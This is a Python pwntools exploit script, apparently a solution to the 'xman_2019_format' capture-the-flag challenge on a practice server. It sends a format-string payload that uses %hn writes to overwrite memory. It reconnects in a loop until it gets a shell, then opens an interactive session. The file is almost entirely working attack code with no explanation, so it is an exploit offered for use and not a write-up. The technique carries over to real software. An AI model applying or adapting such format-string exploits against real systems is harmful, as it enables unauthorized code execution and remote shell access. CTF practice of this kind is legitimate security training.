#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/05 14:23:05
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('xman_2019_format')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 25726
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('xman_2019_format')
while 1:
    sh = remote('node3.buuoj.cn',25726)
    payload = '%12c%10$hhn'
    payload += '|%34219c%18$hn'
    sh.sendline(payload)
    sh.interactive()
    try:
        sh.sendline("echo pwnd")
        sh.recvuntil('pwnd',timeout=1)
        sh.interactive()
        break
    except:
        sh.close()